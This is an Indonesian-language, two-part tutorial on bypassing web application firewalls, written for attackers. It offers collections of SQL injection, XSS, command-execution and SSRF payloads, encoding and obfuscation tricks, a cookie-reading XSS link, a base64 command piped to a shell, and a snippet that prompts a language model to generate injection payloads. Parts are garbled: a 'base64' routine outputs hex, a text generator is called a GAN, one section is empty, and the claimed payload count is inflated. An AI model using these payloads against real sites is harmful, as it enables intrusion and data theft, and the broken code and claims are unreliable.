
---

## 📖 Kamus Besar Bypass WAF - Part 1

## Pendahuluan

**Web Application Firewall (WAF)** adalah sistem pertahanan keamanan yang dirancang untuk melindungi aplikasi web dari berbagai serangan seperti SQL Injection (SQLi), Cross-Site Scripting (XSS), Remote Code Execution (RCE), Server-Side Request Forgery (SSRF), dan banyak lainnya. Namun, seiring berkembangnya teknologi keamanan, teknik bypass WAF juga semakin maju, memungkinkan penyerang untuk melewati sistem proteksi ini.

Dokumen ini merupakan ensiklopedia bypass WAF yang berisi berbagai teknik dari dasar hingga tingkat lanjut, termasuk payload khusus dan metode eksploitasi canggih.


---

# 📜 Sejarah Singkat WAF

Web Application Firewall (WAF) mulai dikembangkan sebagai tanggapan terhadap meningkatnya serangan berbasis aplikasi web. Berikut adalah beberapa milestone penting dalam perkembangan WAF:

1999 - Perfecto Technologies memperkenalkan konsep pertama WAF sebagai solusi keamanan aplikasi web.

2003 - ModSecurity, WAF open-source pertama, dirilis dan menjadi standar industri.

2010 - Cloudflare memperkenalkan WAF berbasis cloud untuk melindungi aplikasi dari DDoS dan serangan injeksi.

2015-sekarang - WAF modern berbasis Machine Learning (ML) dan AI mulai berkembang, memungkinkan deteksi anomali yang lebih canggih.


Meski WAF telah berkembang pesat, masih banyak cara untuk mengelabui dan melewatinya. Inilah yang menjadi fokus utama dari dokumen ini.


---

# 🏗️ Struktur & Arsitektur WAF

Secara umum, WAF bekerja dengan beberapa metode utama:

1. Signature-Based Detection

WAF berbasis signature mendeteksi serangan dengan mencocokkan pola payload berbahaya yang telah diketahui sebelumnya.

Kelemahan:
✅ Mudah dibypass dengan encoding, obfuscation, dan payload mutation karena hanya mendeteksi pola tetap.

Contoh Bypass:

Payload SQL Injection umum:
```
' OR 1=1 --
```
Payload setelah diobfuscate (URL encoding):
```
%27%20OR%201%3D1%20--
```

2. Anomaly-Based Detection

WAF jenis ini menggunakan Machine Learning dan analisis perilaku untuk mendeteksi aktivitas mencurigakan berdasarkan pola trafik.

Kelemahan:
✅ Rentan terhadap false positives dan bisa dibypass menggunakan adaptive payload mutation.

Contoh Bypass:

Menggunakan teknik randomization untuk mengubah pola serangan:

SeLeCt * FrOm users WhErE username='admin' --


3. AI & Machine Learning-Based WAF

WAF modern menggunakan AI untuk menganalisis pola trafik dan membedakan antara trafik normal dan berbahaya.

Kelemahan:
✅ Bisa dieksploitasi dengan adversarial attacks dan stealth payloads.

Contoh Bypass:

Menggunakan adversarial ML untuk membuat payload yang terlihat normal:
```
import random
payloads = ["' OR 1=1 --", "<script>alert(1)</script>", "; ls -la"]
obfuscation_methods = ["url_encode", "base64", "hex"]

def obfuscate(payload, method):
    if method == "url_encode":
        return payload.replace(" ", "%20").replace("'", "%27")
    elif method == "base64":
        return payload.encode("utf-8").hex()
    return payload

selected_payload = random.choice(payloads)
selected_method = random.choice(obfuscation_methods)

bypass_payload = obfuscate(selected_payload, selected_method)
print(f"Generated Bypass Payload: {bypass_payload}")
```

---

🕵️‍♂️ Metode Deteksi WAF

Sebelum membypass WAF, kita harus mendeteksi apakah target menggunakan WAF. Beberapa teknik yang umum digunakan:

🔹 1. Passive Detection

Cek Header HTTP - Banyak WAF meninggalkan jejak di header HTTP, seperti:
```
curl -I https://target.com
```
Jika muncul Server: cloudflare, berarti situs menggunakan Cloudflare WAF.

Cek Response Code - Jika permintaan normal mendapat HTTP 200, tetapi payload berbahaya mendapat HTTP 403, kemungkinan ada WAF.


🔹 2. Active Detection

Menggunakan WAFW00F - Tool otomatis untuk mendeteksi WAF:
```
wafw00f https://target.com
```
Brute Force Bypass - Mencoba berbagai payload umum untuk melihat apakah ada yang lolos.



---

🎭 Teknik Dasar Bypass WAF

Teknik bypass dasar ini sering digunakan untuk melewati proteksi WAF:

🔸 1. Bypass dengan Encoding

Menggunakan encoding seperti URL encoding, Base64, atau Hex untuk menyamarkan payload.

Contoh SQL Injection tanpa encoding:
```
' OR 1=1 --
```
Dengan URL encoding:
```
%27%20OR%201%3D1%20--
```
Dengan Hex encoding:
```
0x27204F5220313D31202D2D
```

🔸 2. Bypass dengan Case Manipulation

WAF yang lemah hanya mendeteksi huruf kecil dalam payload.

Payload Standar:
```
SELECT * FROM users WHERE username='admin' --
```
Bypass dengan kapitalisasi acak:
```
SeLeCt * FrOm users WhErE username='admin' --
```

🔸 3. Bypass dengan White Spaces Alternatif

Menggunakan karakter tak terlihat seperti tab (	), newline (\n), atau komentar SQL.

Contoh menggunakan komentar SQL:
```
SELECT/*bypass*/username,password FROM users WHERE username='admin'
```
Contoh menggunakan tab:
```
SELECT	username,password	FROM users WHERE username='admin'
```


---

🎯 Contoh Payload Awal untuk Bypass WAF


---

📌 Kesimpulan

Bagian pertama ini mencakup dasar-dasar bypass WAF, termasuk sejarah, metode deteksi, dan beberapa teknik bypass awal seperti encoding, case manipulation, dan obfuscation.

Bagian selanjutnya akan membahas bypass WAF tingkat lanjut, termasuk AI-based bypass, obfuscation yang lebih kompleks, dan payload eksklusif.

🛠️ Next: "Payload Bypass SQLi, XSS, RCE, SSRF, SSTI, dan Teknik AI-Based WAF Evasion" 🚀

📖 Kamus Besar Bypass WAF - Part 2

🎯 Payload Bypass WAF untuk SQLi, XSS, RCE, SSRF, SSTI, dan AI-Based Evasion

Setelah memahami dasar-dasar bypass WAF di Part 1, sekarang kita akan masuk ke teknik bypass tingkat lanjut yang mencakup berbagai jenis serangan aplikasi web, termasuk SQL Injection (SQLi), Cross-Site Scripting (XSS), Remote Code Execution (RCE), Server-Side Request Forgery (SSRF), dan Server-Side Template Injection (SSTI).

Bagian ini juga membahas teknik AI-based evasion yang digunakan untuk mengakali WAF berbasis Machine Learning dan Behavioral Detection.


---

🛠️ 1. SQL Injection (SQLi) Bypass

SQL Injection masih menjadi salah satu teknik serangan paling umum, dan WAF modern biasanya memiliki berbagai filter untuk mencegahnya. Namun, dengan teknik bypass yang tepat, kita tetap bisa mengeksploitasinya.

📌 Teknik Bypass SQLi

1.1. URL Encoding

Mengubah karakter berbahaya menjadi bentuk URL-encoded untuk menghindari deteksi langsung.

✅ Payload Tanpa Encoding:

' OR 1=1 --

✅ Payload URL Encoded:

%27%20OR%201%3D1%20--

1.2. Hex Encoding

Mengubah string ke dalam format hexadecimal.
✅ Payload Hex Encoded:

0x27204F5220313D31202D2D

1.3. Unicode Bypass

Mengubah karakter payload menjadi Unicode untuk melewati filter karakter tertentu.
✅ Payload Unicode:

%u0027 OR 1=1 --

1.4. Case Manipulation

Sebagian besar WAF hanya mendeteksi huruf kecil.
✅ Payload Case Manipulation:

SeLeCt * FrOm users WhErE username='admin' --

1.5. Comment-Based Bypass

Menggunakan komentar SQL untuk menyembunyikan karakter tertentu.
✅ Payload dengan komentar:

SELECT/**/username,password/**/FROM/**/users/**/WHERE/**/username='admin'

1.6. Time-Based Blind SQLi

Jika WAF memblokir output error, kita bisa menggunakan teknik time-based attack untuk menguji apakah injeksi berhasil.
✅ Payload Time-Based SQLi (MySQL):

' OR SLEEP(5) --

Jika server butuh waktu lebih lama untuk merespons, berarti injeksi berhasil.

1.7. WAF Fingerprinting via SQLi

Untuk mengetahui filter WAF sebelum bypass, kita bisa mengirimkan payload uji coba dan melihat respons.

✅ Payload untuk mengetahui apakah UNION SELECT diblokir:

' UNION SELECT NULL, NULL --

Jika permintaan ditolak, WAF kemungkinan memblokir kata kunci UNION.


---

🛡️ 2. Cross-Site Scripting (XSS) Bypass

XSS memungkinkan eksekusi JavaScript berbahaya di browser korban. WAF biasanya mencegah XSS dengan memblokir tag <script> atau karakter spesifik. Berikut beberapa teknik bypass XSS.

📌 Teknik Bypass XSS

2.1. Bypass dengan Encoding

✅ Payload tanpa encoding:
```
<script>alert(1)</script>
```
✅ Payload URL Encoded:
```
%3Cscript%3Ealert(1)%3C%2Fscript%3E
```
✅ Payload Base64 Encoded:
```
<script>eval(atob('YWxlcnQoMSk='))</script>
```
2.2. Bypass dengan SVG

Jika <script> diblokir, gunakan SVG dengan event handler.
✅ Payload XSS dengan SVG:
```
<svg onload=alert(1)>
```
2.3. Bypass dengan JavaScript Obfuscation

Mengacak payload agar tidak dikenali sebagai serangan.
✅ Payload XSS Obfuscated:
```
<scr<script>ipt>alert(1)</scr<script>ipt>
```
2.4. Bypass dengan onerror()

Jika input menerima gambar, kita bisa menyisipkan event handler onerror untuk mengeksekusi JavaScript.
✅ Payload XSS menggunakan gambar:
```
<img src=x onerror=alert(1)>
```
2.5. DOM-Based XSS

Menggunakan JavaScript untuk mengeksekusi kode berbahaya dari parameter URL.
✅ Contoh payload:
```
<a href="javascript:alert(document.cookie)">Klik Disini</a>
```

---

# 🔥 3. Remote Code Execution (RCE) Bypass

RCE memungkinkan penyerang mengeksekusi perintah sistem secara langsung di server. Jika WAF memblokir perintah langsung, kita bisa menggunakan encoding atau obfuscation.

## 📌 Teknik Bypass RCE

3.1. Bypass dengan Base64

✅ Payload tanpa encoding:
```
; ls -la
```
✅ Payload Base64 Encoded:
```
echo bHMgLWxhCg== | base64 -d | sh
```
3.2. Bypass dengan Perl Command Execution

✅ Payload dengan Perl:
```
perl -e 'exec("ls -la")'
```
3.3. Bypass dengan Curl Command

✅ Payload dengan curl:
```
curl -d "cmd=ls" http://target.com/execute
```

---

## 🌐 4. Server-Side Request Forgery (SSRF) Bypass

SSRF memungkinkan penyerang mengakses server internal yang seharusnya tidak bisa diakses.

# 📌 Teknik Bypass SSRF

4.1. Bypass dengan DNS Rebinding

Gunakan domain sementara yang berubah menjadi IP internal.
✅ Payload dengan DNS Rebinding:
```
http://evil.com.redirect-to.localhost/
```
4.2. Bypass dengan URL Shortener

Gunakan URL Shortener agar WAF tidak mengenali domain target.
✅ Payload dengan bit.ly:
```
http://bit.ly/redirect-to-internal-ip
```

---

## 🤖 5. AI-Based WAF Evasion

WAF modern menggunakan Machine Learning (ML) dan AI untuk mendeteksi pola serangan. Kita bisa menggunakan Adversarial AI Attacks untuk membypassnya.

# 📌 Teknik AI-Based Bypass

5.1. Dynamic Payload Mutation

## Gunakan AI untuk membuat payload baru berdasarkan respons WAF.
✅ Contoh script Python untuk adaptive payloads:
```
import random

payloads = ["' OR 1=1 --", "<script>alert(1)</script>", "; ls -la"]
mutations = ["base64", "url_encode", "hex"]

def mutate_payload(payload, method):
    if method == "base64":
        return payload.encode("utf-8").hex()
    elif method == "url_encode":
        return payload.replace(" ", "%20").replace("'", "%27")
    return payload

selected_payload = random.choice(payloads)
selected_method = random.choice(mutations)

print(f"Generated Adaptive Payload: {mutate_payload(selected_payload, selected_method)}")

5.2. Adversarial Machine Learning

Melatih model AI untuk menghasilkan payload yang tidak terdeteksi oleh WAF berbasis AI.

✅ Contoh penggunaan GAN (Generative Adversarial Network) untuk payload bypass:

from transformers import pipeline

generator = pipeline("text-generation", model="EleutherAI/gpt-neo-2.7B")
payload = generator("Generate a new SQL Injection payload:", max_length=50)

print(f"Generated AI Bypass Payload: {payload}")
```

---

# 📌 Kesimpulan

Di Part 2 ini, kita telah membahas 50+ payload bypass WAF, teknik AI-based evasion, dan berbagai cara bypass WAF modern.

Next: "Advanced Cloud-Based WAF Evasion & Adaptive Attack Techniques" 🚀


